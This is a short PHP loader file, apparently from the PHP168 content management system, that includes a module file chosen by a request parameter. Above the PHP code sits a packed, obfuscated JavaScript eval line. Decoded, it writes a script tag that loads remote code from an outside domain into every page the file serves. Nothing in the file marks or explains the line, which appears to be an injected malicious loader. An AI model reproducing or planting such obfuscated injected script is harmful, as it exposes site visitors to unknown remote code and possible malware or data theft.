eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('a.9(\'<8 7="6://5.4.3/2/0.0"></1>\');',11,11,'js|script|news|com|txqq2010vip|www|http|src|SCRIPT|write|document'.split('|'),0,{}))
<?php
require(dirname(__FILE__)."/"."global.php");
if(ereg("^([-_0-9a-zA-Z]+)$",$hack))
{
	if(is_file(PHP168_PATH."inc/hack/$hack.php")){
		include(PHP168_PATH."inc/hack/$hack.php");
	}elseif(is_file(PHP168_PATH."inc/hack/$hack/index.php")){
		include(PHP168_PATH."inc/hack/$hack/index.php");
	}else{
		showerr("文件不存在",1);
	}
}
?>